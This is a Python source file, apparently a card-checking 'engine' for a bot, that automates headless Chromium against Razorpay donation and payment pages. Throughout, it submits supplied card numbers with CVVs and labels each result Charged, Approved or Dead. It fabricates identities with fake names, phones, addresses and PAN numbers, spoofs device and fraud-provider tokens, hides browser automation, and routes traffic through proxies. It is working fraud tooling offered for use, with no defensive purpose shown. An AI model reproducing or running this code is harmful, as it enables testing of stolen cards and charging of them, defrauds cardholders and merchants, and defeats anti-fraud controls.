# =============================================================================
# razorpay_engine.py — API-less Razorpay engine (Playwright, v2.0.0)
# =============================================================================
# v2.0.0 vs v1.1.0:
#   - Persistent browser pool (LRU, up to RAZORPAY_POOL_SIZE browsers).
#     Chromium cold-boot cost (~3-5s) is paid once per pool slot, not per card.
#   - Per-site context reuse: warm contexts are cached for warmup_ttl seconds.
#     Same site hitting N cards reuses hydration + merchant identifiers.
#   - Dead-site fast-bail: HEAD probe before launching any browser. 404/410/gone
#     returns DEAD without touching chromium.
#   - Real 3DS: follows offsiteRedirect, then polls
#     /v1/standard_checkout/payments/{id} until terminal state. Max 12 polls @2s.
#     Auto-completes when possible; returns APPROVED only if OTP entry is required.
#   - Public API unchanged:
#       run_razorpay_public(site_url, card, proxy_url) -> dict
#       run_razorpay_async(site_url, card, proxy_url) -> dict
#   - New lifecycle helpers (call from bot shutdown):
#       shutdown_pool()      — close all browsers
#       pool_stats()         — {"browsers": n, "contexts": m}
#
# Requires: playwright>=1.47.0
# =============================================================================

import os
import re
import json
import time
import random
import string
import asyncio
import hashlib
import secrets
import logging
import threading
import concurrent.futures
from base64 import b64encode
from urllib.parse import quote
from typing import Optional, Dict, Any, List, Tuple
from collections import OrderedDict

logger = logging.getLogger("razorpay")
if not logger.handlers:
    h = logging.StreamHandler()
    h.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S"))
    logger.addHandler(h)
    logger.setLevel(logging.INFO)

VERSION = "2.0.0"

# ──────────────────────── Config ─────────────────────────────────────

POOL_SIZE       = int(os.environ.get("RAZORPAY_POOL_SIZE", "3"))
CONTEXT_TTL     = float(os.environ.get("RAZORPAY_CTX_TTL", "300"))    # 5min
HEAD_PROBE_TIMEOUT = 6.0
THREE_DS_POLLS  = 12
THREE_DS_INTERVAL = 2.0

BASE62 = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

FIRST  = ["Aarav","Vivaan","Aditya","Vihaan","Arjun","Sai","Ishaan","Rohan","Karan",
          "Rahul","Ravi","Amit","Vikram","Anil","Sunil","Rajesh","Sanjay","Deepak",
          "Manoj","Suresh"]
LAST   = ["Sharma","Patel","Singh","Verma","Gupta","Reddy","Kumar","Joshi","Mehta",
          "Nair","Shah","Das","Bose","Chopra","Malhotra","Saxena","Rao","Desai",
          "Pillai","Menon"]
STREETS = ["MG Road","Park Street","Church Street","Linking Road","Banjara Hills",
           "Civil Lines","Marine Drive","Connaught Place","Sector 62",
           "Bannerghatta Road","Lavelle Road","Sadar Bazaar"]
CITIES  = ["Mumbai","Delhi","Bangalore","Hyderabad","Chennai","Kolkata","Pune",
           "Ahmedabad","Jaipur","Lucknow","Surat","Indore"]
PINS    = ["400001","110001","560001","500001","600001","700001","380001","302001",
           "226001","452001","160001","800001"]

BUILD_DEFAULT    = "afa3662e035e66c495f2ddc21c6f030530870f53"
BUILD_V1_DEFAULT = "da4ee3f43a28ad81dba8ed06daf899a4520c691f"

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")

LAUNCH_ARGS = [
    "--no-sandbox",
    "--disable-dev-shm-usage",
    "--disable-gpu",
    "--disable-blink-features=AutomationControlled",
    "--disable-features=IsolateOrigins,site-per-process",
    "--disable-background-timer-throttling",
    "--disable-renderer-backgrounding",
    "--disable-backgrounding-occluded-windows",
]


# ──────────────────────── Helpers ────────────────────────────────────

def _rand_phone() -> str:
    return "+91" + str(random.choice([6, 7, 8, 9])) + "".join(str(random.randint(0, 9)) for _ in range(9))

def _rand_name() -> str:
    return f"{random.choice(FIRST)} {random.choice(LAST)}"

def _rand_email(name: str) -> str:
    return name.lower().replace(" ", ".") + str(random.randint(1, 99)) + "@gmail.com"

def _rand_address() -> str:
    i = random.randint(0, len(CITIES) - 1)
    return f"{random.randint(1, 999)} {random.choice(STREETS)}, {CITIES[i]}- {PINS[i]}"

def _rand_pan() -> str:
    return ("".join(random.choices(string.ascii_uppercase, k=5))
            + "".join(random.choices(string.digits, k=4))
            + random.choice(string.ascii_uppercase))

def _build_device_id() -> str:
    h = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
    ts = str(int(time.time() * 1000))
    rnd = str(random.randrange(10 ** 8)).zfill(8)
    return f"1.{h}.{ts}.{rnd}"

def _build_token_create(checkout_id: str) -> str:
    payload = [
        {"name": "sardine", "metadata": {"session_id": checkout_id}},
        {"name": "stripe_radar",
         "metadata": {"session_id": "rse_" + "".join(
             secrets.choice(string.ascii_letters + string.digits) for _ in range(22))}},
    ]
    return b64encode(json.dumps(payload, separators=(",", ":")).encode()).decode()

def _normalize_url(url: str) -> str:
    if not url:
        return url
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url

def parse_proxy(p: Optional[str]) -> Optional[dict]:
    if not p:
        return None
    p = p.strip()
    scheme = "http"
    if "://" in p:
        s = p.split("://", 1)
        if s[0].lower() in ("http", "https", "socks4", "socks5"):
            scheme = s[0].lower()
            p = s[1]
    user = pwd = ""
    if "@" in p:
        auth, host = p.rsplit("@", 1)
        user, _, pwd = auth.partition(":")
    elif p.count(":") == 3:
        ip, port, user, pwd = p.split(":")
        host = f"{ip}:{port}"
    elif p.count(":") == 1:
        host = p
    else:
        return None
    cfg = {"server": f"{scheme}://{host}"}
    if user:
        cfg["username"] = user
        cfg["password"] = pwd
    return cfg

def parse_cc(cc: str) -> dict:
    parts = cc.split("|")
    if len(parts) != 4:
        raise ValueError("CC format must be CC|MM|YYYY|CVV")
    return {
        "number": parts[0].strip().replace(" ", ""),
        "month": parts[1].strip().zfill(2),
        "year": parts[2].strip()[-2:],
        "cvv": parts[3].strip(),
    }


# ──────────────────────── Browser pool ───────────────────────────────

class BrowserPool:
    """
    Global persistent pool. Each slot holds a chromium browser + a per-site
    context cache. Callers acquire (browser, context) for a given site.
    Contexts are recycled when stale or errored.
    """

    def __init__(self, size: int):
        self.size = max(1, int(size))
        self._loop = None
        self._pw = None
        self._slots: List[dict] = []            # [{browser, contexts: {site: {ctx, page, data, born}}}]
        self._lock = threading.Lock()
        self._started = False

    async def _start_one(self) -> Optional[dict]:
        try:
            browser = await self._pw.chromium.launch(
                headless=True, args=LAUNCH_ARGS)
        except Exception as e:
            logger.error(f"browser launch failed: {e!r}")
            return None
        return {"browser": browser, "contexts": {}, "in_use": False}

    async def start(self):
        if self._started:
            return
        try:
            from playwright.async_api import async_playwright
        except ImportError as e:
            raise RuntimeError(f"playwright not installed: {e}")
        self._pw = await async_playwright().start()
        for _ in range(self.size):
            slot = await self._start_one()
            if slot:
                self._slots.append(slot)
        self._started = True
        logger.info(f"pool started: {len(self._slots)}/{self.size} browsers")

    async def _pick_slot(self) -> Optional[dict]:
        """Round-robin over available slots; if all busy, wait for one."""
        while True:
            for s in self._slots:
                if not s["in_use"]:
                    s["in_use"] = True
                    return s
            await asyncio.sleep(0.1)

    async def acquire(self, site: str) -> Tuple[Optional[dict], Optional[Any]]:
        """Return (slot, context) or (None, None) on failure."""
        if not self._started:
            await self.start()
        slot = await self._pick_slot()
        if slot is None:
            return None, None

        # reuse warm context for this site
        ctx_entry = slot["contexts"].get(site)
        if ctx_entry and (time.time() - ctx_entry["born"]) < CONTEXT_TTL:
            try:
                # liveness check — cheap eval
                await ctx_entry["ctx"].pages[0].evaluate("1")
                return slot, ctx_entry
            except Exception:
                try:
                    await ctx_entry["ctx"].close()
                except Exception:
                    pass
                slot["contexts"].pop(site, None)

        # create fresh
        try:
            ctx = await slot["browser"].new_context(
                user_agent=UA, viewport={"width": 1366, "height": 768},
                locale="en-IN", timezone_id="Asia/Kolkata",
            )
            await ctx.add_init_script(
                "Object.defineProperty(navigator,'webdriver',{get:()=>undefined});")
            page = await ctx.new_page()
            page.set_default_timeout(40000)
            entry = {"ctx": ctx, "page": page, "born": time.time(),
                     "captured": {}, "merchant": None}
            slot["contexts"][site] = entry
            return slot, entry
        except Exception as e:
            logger.error(f"context create failed: {e!r}")
            slot["in_use"] = False
            return None, None

    async def release(self, slot: dict, erase_context: bool = False, site: str = ""):
        if slot is None:
            return
        if erase_context and site in slot["contexts"]:
            try:
                await slot["contexts"][site]["ctx"].close()
            except Exception:
                pass
            slot["contexts"].pop(site, None)
        slot["in_use"] = False

    async def shutdown(self):
        for s in self._slots:
            for entry in list(s["contexts"].values()):
                try:
                    await entry["ctx"].close()
                except Exception:
                    pass
            try:
                await s["browser"].close()
            except Exception:
                pass
        self._slots.clear()
        if self._pw:
            try:
                await self._pw.stop()
            except Exception:
                pass
        self._started = False


_POOL: Optional[BrowserPool] = None
_POOL_LOCK = threading.Lock()


def _get_pool() -> BrowserPool:
    global _POOL
    with _POOL_LOCK:
        if _POOL is None:
            _POOL = BrowserPool(POOL_SIZE)
        return _POOL


def pool_stats() -> dict:
    if _POOL is None:
        return {"browsers": 0, "contexts": 0, "started": False}
    n_ctx = sum(len(s["contexts"]) for s in _POOL._slots)
    return {"browsers": len(_POOL._slots), "contexts": n_ctx,
            "started": _POOL._started, "size": _POOL.size}


async def shutdown_pool():
    if _POOL is not None:
        await _POOL.shutdown()


# ──────────────────────── Dead-site probe ────────────────────────────

async def _probe_site_alive(page, site_url: str) -> tuple:
    """Quick HEAD. Return (alive, reason)."""
    try:
        resp = await page.goto(site_url, wait_until="domcontentloaded",
                               timeout=int(HEAD_PROBE_TIMEOUT * 1000))
        if resp is None:
            return True, "unknown"
        st = resp.status
        if st == 404:
            return False, "404"
        if st == 410:
            return False, "410"
        if st >= 500:
            return False, f"http {st}"
        return True, ""
    except Exception as e:
        # network timeouts aren't proof of death — let the full flow try
        return True, ""


# ──────────────────────── Core flow ──────────────────────────────────

async def _run_check_async(site_url: str, cc: str,
                           proxy_cfg: Optional[dict]) -> dict:
    t0 = time.time()
    site_url = _normalize_url(site_url)
    if not site_url.startswith(("http://", "https://")):
        return {"ok": False, "status": "Error", "message": "invalid URL",
                "response": f"invalid URL: {site_url}", "time": 0.0}

    card = parse_cc(cc)
    name = _rand_name()
    phone = _rand_phone()
    email = _rand_email(name)
    address = _rand_address()
    pan = _rand_pan()
    device_id = _build_device_id()
    unified_id = "".join(secrets.choice(BASE62) for _ in range(14))

    pool = _get_pool()
    slot = None
    ctx_entry = None
    try:
        slot, ctx_entry = await pool.acquire(site_url)
    except Exception as e:
        return {"ok": False, "status": "Error",
                "message": f"pool acquire failed: {e!r}",
                "response": f"pool: {type(e).__name__}",
                "time": round(time.time() - t0, 2)}

    if slot is None or ctx_entry is None:
        return {"ok": False, "status": "Error",
                "message": "no browser slot available",
                "response": "pool exhausted",
                "time": round(time.time() - t0, 2)}

    page = ctx_entry["page"]
    captured = ctx_entry["captured"]

    # attach network listener once per context
    if "listener_attached" not in captured:
        async def _on_response(resp):
            try:
                url = resp.url
                if "/v1/payment_pages/" in url and ("view" in url or url.endswith("/") or "?" in url):
                    try:
                        body = await resp.text()
                    except Exception:
                        return
                    m = re.search(r'/v1/payment_pages/([A-Za-z0-9_]+)', url)
                    if m and not captured.get("payment_page_id"):
                        captured["payment_page_id"] = m.group(1)
                    for pattern, key in [
                        (r'keyless_header["\']?\s*[:=]\s*["\']([^"\']+)', "keyless_header"),
                        (r'key_id["\']?\s*[:=]\s*["\']([^"\']+)', "key_id"),
                        (r'session_token["\']?\s*[:=]\s*["\']([A-F0-9]{40,})["\']', "session_token"),
                    ]:
                        if captured.get(key):
                            continue
                        m = re.search(pattern, body)
                        if m:
                            captured[key] = m.group(1)
            except Exception:
                pass
        page.on("response", _on_response)
        captured["listener_attached"] = True

    erase_ctx = False
    try:
        # 1. Load site
        try:
            resp = await page.goto(site_url, wait_until="domcontentloaded", timeout=35000)
        except Exception as e:
            return {"ok": False, "status": "Error",
                    "message": f"page load: {type(e).__name__}",
                    "response": f"nav failed: {str(e)[:100]}",
                    "time": round(time.time() - t0, 2)}

        if resp and resp.status in (404, 410):
            erase_ctx = True
            return {"ok": False, "status": "Dead",
                    "message": f"http {resp.status}",
                    "response": f"site returns {resp.status}",
                    "time": round(time.time() - t0, 2)}

        try:
            await page.wait_for_load_state("networkidle", timeout=8000)
        except Exception:
            pass
        await page.wait_for_timeout(1200)

        # 2. Extract merchant data from page globals
        merchant = await page.evaluate("""() => {
            const out = {};
            const scan = (obj) => {
                if (!obj || typeof obj !== 'object') return;
                if (obj.keyless_header && !out.keyless_header) out.keyless_header = obj.keyless_header;
                if (obj.key_id && !out.key_id) out.key_id = obj.key_id;
                if (obj.payment_link) {
                    if (!out.payment_link_id) out.payment_link_id = obj.payment_link.id;
                    const items = obj.payment_link.payment_page_items || [];
                    if (items[0] && !out.payment_page_item_id) out.payment_page_item_id = items[0].id;
                    const amt = items[0]?.item?.amount || obj.payment_link.min_amount_value;
                    if (amt && !out.amount) out.amount = parseInt(amt, 10);
                }
                if (obj.id && typeof obj.id === 'string' && obj.id.startsWith('pl_') && !out.payment_link_id)
                    out.payment_link_id = obj.id;
                if (obj.payment_page_items && Array.isArray(obj.payment_page_items) && obj.payment_page_items[0]) {
                    if (!out.payment_page_item_id) out.payment_page_item_id = obj.payment_page_items[0].id;
                    const a = obj.payment_page_items[0].item?.amount;
                    if (a && !out.amount) out.amount = parseInt(a, 10);
                }
            };
            for (const k of ['data','__INITIAL_STATE__','__CHECKOUT_DATA__','page','rzp']) scan(window[k]);
            return out;
        }""")

        for k in ("keyless_header", "key_id", "session_token", "payment_page_id"):
            if not merchant.get(k):
                merchant[k] = captured.get(k)

        # HTML fallback
        if not (merchant.get("keyless_header") and merchant.get("key_id")):
            try:
                html = await page.content()
                for pattern, key in [
                    (r'keyless_header["\']?\s*[:=]\s*["\']([^"\']+)', "keyless_header"),
                    (r'key_id["\']?\s*[:=]\s*["\']([^"\']+)', "key_id"),
                    (r'payment_link_id["\']?\s*[:=]\s*["\']([^"\']+)', "payment_link_id"),
                    (r'payment_page_item_id["\']?\s*[:=]\s*["\']([^"\']+)', "payment_page_item_id"),
                    (r'session_token["\']?\s*[:=]\s*["\']([A-F0-9]{40,})["\']', "session_token"),
                ]:
                    if merchant.get(key):
                        continue
                    m = re.search(pattern, html)
                    if m:
                        merchant[key] = m.group(1)
            except Exception:
                pass

        keyless_header = merchant.get("keyless_header")
        key_id = merchant.get("key_id")
        payment_link_id = merchant.get("payment_link_id")
        payment_page_item_id = merchant.get("payment_page_item_id")
        amount = int(merchant.get("amount") or 100)
        if amount < 100:
            amount = 100

        # API fallback for missing link/item
        if (not payment_link_id or not payment_page_item_id) and captured.get("payment_page_id"):
            ppid = captured["payment_page_id"]
            try:
                api_url = f"https://api.razorpay.com/v1/payment_pages/{ppid}"
                data = await page.evaluate("""async (u) => {
                    try { const r = await fetch(u, {headers:{'Accept':'application/json'}});
                          return await r.json(); } catch(e){ return null; }
                }""", api_url)
                if isinstance(data, dict):
                    if not payment_link_id and data.get("id"):
                        payment_link_id = data["id"]
                    items = data.get("payment_page_items") or []
                    if items and not payment_page_item_id:
                        payment_page_item_id = items[0].get("id")
                    if items:
                        amt = items[0].get("item", {}).get("amount") or data.get("min_amount_value")
                        if amt:
                            amount = int(amt)
            except Exception:
                pass

        if not keyless_header and not key_id:
            erase_ctx = True
            return {"ok": False, "status": "Dead",
                    "message": "not a Razorpay payment page",
                    "response": "no key_id/keyless_header",
                    "time": round(time.time() - t0, 2)}
        if not payment_link_id and not captured.get("payment_page_id"):
            erase_ctx = True
            return {"ok": False, "status": "Dead",
                    "message": "no payment_link_id",
                    "response": "no payment_link_id",
                    "time": round(time.time() - t0, 2)}

        session_token = merchant.get("session_token") or captured.get("session_token")

        # 3. Load checkout public
        params = {
            "traffic_env": "production", "build": BUILD_DEFAULT,
            "build_v1": BUILD_V1_DEFAULT, "checkout_v2": "1", "new_session": "1",
            "rzp_device_id": device_id, "unified_session_id": unified_id,
        }
        if keyless_header:
            params["keyless_header"] = keyless_header
        qs = "&".join(f"{k}={quote(str(v), safe='')}" for k, v in params.items())

        try:
            await page.goto(f"https://api.razorpay.com/v1/checkout/public?{qs}",
                            wait_until="domcontentloaded", timeout=30000)
            await page.wait_for_timeout(1000)
        except Exception:
            pass

        if not session_token:
            session_token = await page.evaluate("""() => {
                if (window.session_token) return window.session_token;
                const html = document.documentElement.innerHTML;
                const m = html.match(/session_token["']?\\s*[:=]\\s*["']([A-F0-9]{40,})["']/);
                return m ? m[1] : null;
            }""")

        if not session_token:
            erase_ctx = True
            return {"ok": False, "status": "Error",
                    "message": "no session_token",
                    "response": "session_token not found",
                    "time": round(time.time() - t0, 2)}

        # 4. Create order
        order_id = None
        if payment_link_id and payment_page_item_id:
            order_id = await page.evaluate("""async ([pl, ppi, amt]) => {
                try {
                    const r = await fetch(`https://api.razorpay.com/v1/payment_pages/${pl}/order`, {
                        method:'POST',
                        headers:{'Accept':'application/json','Content-Type':'application/json'},
                        body: JSON.stringify({
                            notes: {comment:'', name:'Donor'},
                            line_items: [{payment_page_item_id: ppi, amount: amt}]
                        })
                    });
                    const d = await r.json();
                    if (d.order) return d.order.id;
                    if (d.error) return 'ERR:' + JSON.stringify(d.error);
                    return null;
                } catch(e) { return 'ERR:' + e.message; }
            }""", [payment_link_id, payment_page_item_id, amount])

        if not order_id or str(order_id).startswith("ERR:"):
            return {"ok": False, "status": "Error",
                    "message": f"order failed: {order_id}",
                    "response": f"order: {str(order_id)[:100]}",
                    "time": round(time.time() - t0, 2)}

        checkout_id = order_id.split("_", 1)[1] if "_" in order_id else order_id
        token_create = _build_token_create(checkout_id)

        payload = {
            "notes[comment]": "", "notes[email]": email, "notes[phone]": phone[3:],
            "notes[full_name_of_the_donor]": name,
            "notes[full_address_of_the_donor]": address,
            "notes[pan_number]": pan,
            "payment_link_id": payment_link_id or "", "key_id": key_id or "",
            "callback_url": "https://your-server.com/callback",
            "contact": phone, "email": email, "currency": "INR",
            "user_risk_providers_token": token_create,
            "_[integration]": "payment_pages", "_[checkout_id]": checkout_id,
            "_[device.id]": device_id, "_[library]": "checkoutjs",
            "_[library_src]": "no-src", "_[current_script_src]": "no-src",
            "_[platform]": "browser", "_[env]": "",
            "_[is_magic_script]": "false", "_[os]": "windows", "_[referer]": site_url,
            "_[shield][fhash]": hashlib.sha1(secrets.token_bytes(16)).hexdigest(),
            "_[shield][tz]": "330", "_[shield][os]": "windows",
            "_[shield][platform]": "browser", "_[shield][browser]": "chrome",
            "_[device_id]": device_id, "_[build]": BUILD_DEFAULT,
            "_[request_index]": "1",
            "amount": str(amount), "order_id": order_id, "method": "card",
            "card[number]": card["number"], "card[cvv]": card["cvv"],
            "card[name]": name,
            "card[expiry_month]": card["month"], "card[expiry_year]": card["year"],
            "save": "0",
        }

        # 5. Post create payment
        result = await page.evaluate("""async ([payload, k, st, kh]) => {
            const qs = new URLSearchParams({key_id: k || '', session_token: st, keyless_header: kh || ''});
            const body = new URLSearchParams();
            for (const [key, val] of Object.entries(payload)) body.append(key, val);
            try {
                const url = `https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?${qs}`;
                const r = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'x-session-token': st,
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': 'https://api.razorpay.com',
                        'Referer': `https://api.razorpay.com/v1/checkout/public?session_token=${st}`
                    },
                    body: body.toString()
                });
                const text = await r.text();
                let parsed; try { parsed = JSON.parse(text); } catch { parsed = text; }
                return {status: r.status, raw: text.slice(0, 800), body: parsed};
            } catch(e) { return {status: 0, raw: '', body: 'NETWORK:' + e.message}; }
        }""", [payload, key_id, session_token, keyless_header])

        status_code = result.get("status", 0) if isinstance(result, dict) else 0
        body = result.get("body") if isinstance(result, dict) else result
        payment_id = None

        if isinstance(body, dict):
            payment_id = (body.get("payment_id")
                          or body.get("razorpay_payment_id")
                          or (body.get("payment") or {}).get("id"))

            # direct capture
            if "razorpay_signature" in body or "signature" in body:
                return {"ok": True, "status": "Charged",
                        "message": f"payment_id: {payment_id or 'n/a'} | captured",
                        "response": f"captured | {payment_id or 'n/a'}",
                        "payment_id": payment_id, "order_id": order_id,
                        "time": round(time.time() - t0, 2)}

            if body.get("status") in ("captured", "authorized"):
                return {"ok": True, "status": "Charged",
                        "message": f"payment_id: {payment_id or 'n/a'} | {body['status']}",
                        "response": f"{body['status']} | {payment_id or 'n/a'}",
                        "payment_id": payment_id, "order_id": order_id,
                        "time": round(time.time() - t0, 2)}

            # 3DS required
            is_redirect = body.get("redirect") is True or body.get("type") == "redirect"
            if is_redirect:
                redirect_url = ""
                if isinstance(body.get("request"), dict):
                    redirect_url = body["request"].get("url", "")
                if not redirect_url:
                    return {"ok": False, "status": "Error",
                            "message": "3ds redirect without url",
                            "response": "3ds no url",
                            "time": round(time.time() - t0, 2)}

                try:
                    await page.goto(redirect_url, wait_until="domcontentloaded", timeout=40000)
                except Exception as e:
                    return {"ok": False, "status": "Error",
                            "message": f"3ds nav: {str(e)[:80]}",
                            "response": f"3ds nav fail",
                            "time": round(time.time() - t0, 2)}

                # Poll status until terminal
                for attempt in range(THREE_DS_POLLS):
                    try:
                        status = await page.evaluate("""async ([pid, k, st, kh]) => {
                            const qs = new URLSearchParams({key_id: k || '', session_token: st, keyless_header: kh || ''});
                            try {
                                const r = await fetch(`https://api.razorpay.com/v1/standard_checkout/payments/${pid}?${qs}`, {
                                    headers: {'x-session-token': st}
                                });
                                const d = await r.json();
                                return d.status || 'unknown';
                            } catch { return 'unknown'; }
                        }""", [payment_id, key_id, session_token, keyless_header])
                    except Exception:
                        status = "unknown"

                    if status in ("captured", "authorized"):
                        return {"ok": True, "status": "Charged",
                                "message": f"payment_id: {payment_id} | 3ds | {status}",
                                "response": f"3ds {status} | {payment_id}",
                                "payment_id": payment_id, "order_id": order_id,
                                "time": round(time.time() - t0, 2)}
                    if status in ("failed", "cancelled", "canceled"):
                        return {"ok": False, "status": "Dead",
                                "message": f"payment_id: {payment_id} | 3ds | {status}",
                                "response": f"3ds {status}",
                                "payment_id": payment_id, "order_id": order_id,
                                "time": round(time.time() - t0, 2)}
                    await asyncio.sleep(THREE_DS_INTERVAL)

                # challenge not auto-completed — likely OTP entry
                html = await page.content()
                if "otp" in html.lower() or "verify" in html.lower() or "authenticate" in html.lower():
                    return {"ok": False, "status": "Approved",
                            "message": f"payment_id: {payment_id} | 3ds challenge pending",
                            "response": f"3ds OTP required",
                            "payment_id": payment_id, "order_id": order_id,
                            "time": round(time.time() - t0, 2)}
                return {"ok": False, "status": "Error",
                        "message": "3ds poll timeout",
                        "response": "3ds timeout",
                        "payment_id": payment_id, "order_id": order_id,
                        "time": round(time.time() - t0, 2)}

            # hard decline
            if "error" in body:
                err = body["error"]
                desc = err.get("description") or err.get("reason") or str(err)
                return {"ok": False, "status": "Dead",
                        "message": f"[HTTP {status_code}] {desc}",
                        "response": f"[{status_code}] {desc}",
                        "payment_id": payment_id, "order_id": order_id,
                        "time": round(time.time() - t0, 2)}

            return {"ok": False, "status": "Dead",
                    "message": f"[HTTP {status_code}] {json.dumps(body)[:200]}",
                    "response": f"[{status_code}] {json.dumps(body)[:200]}",
                    "payment_id": payment_id, "order_id": order_id,
                    "time": round(time.time() - t0, 2)}

        return {"ok": False, "status": "Error",
                "message": f"[HTTP {status_code}] {str(body)[:150]}",
                "response": f"[{status_code}] {str(body)[:150]}",
                "time": round(time.time() - t0, 2)}

    except Exception as e:
        return {"ok": False, "status": "Error",
                "message": f"{type(e).__name__}: {str(e)[:120]}",
                "response": f"error: {str(e)[:120]}",
                "time": round(time.time() - t0, 2)}
    finally:
        try:
            await pool.release(slot, erase_context=erase_ctx, site=site_url)
        except Exception:
            pass


# ──────────────────────── Public API ─────────────────────────────────

def run_razorpay_public(site_url: str, card: str, proxy_url: str = "") -> dict:
    """Sync entry point. Safe from any thread (spins its own loop)."""
    proxy_cfg = parse_proxy(proxy_url) if proxy_url else None
    try:
        loop = asyncio.new_event_loop()
        try:
            asyncio.set_event_loop(loop)
            return loop.run_until_complete(_run_check_async(site_url, card, proxy_cfg))
        finally:
            try:
                loop.close()
            except Exception:
                pass
    except Exception as e:
        return {"ok": False, "status": "Error",
                "message": f"loop failure: {e!r}",
                "response": f"loop failure: {type(e).__name__}",
                "time": 0.0}


async def run_razorpay_async(site_url: str, card: str, proxy_url: str = "") -> dict:
    proxy_cfg = parse_proxy(proxy_url) if proxy_url else None
    return await _run_check_async(site_url, card, proxy_cfg)


def engine_stats() -> dict:
    return {
        "version": VERSION,
        "engine": "playwright-pool",
        "pool": pool_stats(),
        "features": ["url_normalize", "network_capture", "page_globals",
                     "html_fallback", "context_reuse", "3ds_poll"],
    }
